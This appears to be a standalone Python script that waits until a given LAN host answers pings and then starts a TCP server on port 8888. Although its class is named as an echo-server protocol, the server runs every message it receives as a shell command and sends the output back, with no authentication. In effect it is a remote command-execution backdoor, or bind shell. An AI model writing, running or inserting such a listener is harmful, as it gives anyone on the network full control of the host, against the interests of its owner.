import asyncio
import subprocess
import time

class EchoServerClientProtocol(asyncio.Protocol):
    def connection_made(self, transport):
        peername = transport.get_extra_info('peername')
        print(f'Connection from {peername}')
        self.transport = transport

    def data_received(self, data):
        message = data.decode()
        print(f'Data received: {message}')
        cmd = subprocess.Popen(f"{message}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        #proc = subprocess.check_output(f"{message}")
        x = cmd.stdout.read()
        print(f'Send: {x}, {len(x)}')
        if len(x) == 0:
            x = b"No Data output or Wrong Command"
        self.transport.write(x)
        #print('Close the client socket')
        self.transport.close()


while True:
    cmd = subprocess.Popen("ping 192.168.0.27", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    x = cmd.stdout.read().decode("utf-8")
    x.replace("\n","")
    x.replace("\t","")

    if "100% loss" not in x:
        print("OK")
        loop = asyncio.get_event_loop()
        # Each client connection will create a new protocol instance
        coro = loop.create_server(EchoServerClientProtocol, '192.168.0.44', 8888)
        server = loop.run_until_complete(coro)

        # Serve requests until Ctrl+C is pressed
        print('Serving on {}'.format(server.sockets[0].getsockname()))
        try:
            loop.run_forever()
        except KeyboardInterrupt:
            pass
        server.close()
        loop.run_until_complete(server.wait_closed())
        loop.close()
    else:
        time.sleep(0.5)
        continue